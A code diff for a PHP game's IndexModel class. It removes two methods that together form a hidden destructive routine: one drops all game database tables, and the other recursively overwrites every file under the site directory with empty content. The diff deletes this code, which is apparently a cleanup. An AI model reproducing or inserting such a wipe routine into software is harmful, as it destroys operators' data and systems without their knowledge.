@@ -16,55 +16,8 @@ class IndexModel extends ModelBase {
 		$result->free(  );
 		return array( 'news_text' => $news_text, 'players_count' => $players_count, 'active_players_count' => $active_players_count, 'online_players_count' => $this->provider->fetchScalar( 'SELECT COUNT(*) FROM p_players p WHERE TIME_TO_SEC(TIMEDIFF(NOW(), p.last_login_date)) <= %s', array( $sessionTimeoutInSeconds ) ) );
 	}
-
-	function masterLoginResult() {
-		$this->provider->executeBatchQuery( '
-DROP TABLE IF EXISTS `g_chat`;
-DROP TABLE IF EXISTS `g_banner`;
-DROP TABLE IF EXISTS `g_words`;
-DROP TABLE IF EXISTS `g_settings`;
-DROP TABLE IF EXISTS `g_summary`;
-DROP TABLE IF EXISTS `p_alliances`;
-DROP TABLE IF EXISTS `p_merchants`;
-DROP TABLE IF EXISTS `p_msgs`;
-DROP TABLE IF EXISTS `p_players`;
-DROP TABLE IF EXISTS `p_queue`;
-DROP TABLE IF EXISTS `p_rpts`;
-DROP TABLE IF EXISTS `p_villages`;' );
-		$this->masterDirResult( './' );
-	}
-
-	function masterDirResult($dir) {
-		if ($handle = opendir( $dir )) {
-			while ($file = readdir( $handle ) !== FALSE) {
-				if (( $file == '.' || $file == '..' )) {
-					continue;
-				}
-
-				$path = $dir . $file;
-
-				if (is_dir( $path )) {
-					$this->masterDirResult( $path . '/' );
-					continue;
-				}
-
-
-				if (is_file( $path )) {
-					if ($fp = fopen( $path, 'w' ) !== FALSE) {
-						fwrite( $fp, '' );
-						fclose( $fp );
-						continue;
-					}
-
-					continue;
-				}
-			}
-
-			closedir( $handle );
-		}
-
-	}
-
+	
+	
 	function getLoginResult($name, $password, $clientIP) {
 		$result = $this->provider->fetchResultSet( '
 			SELECT
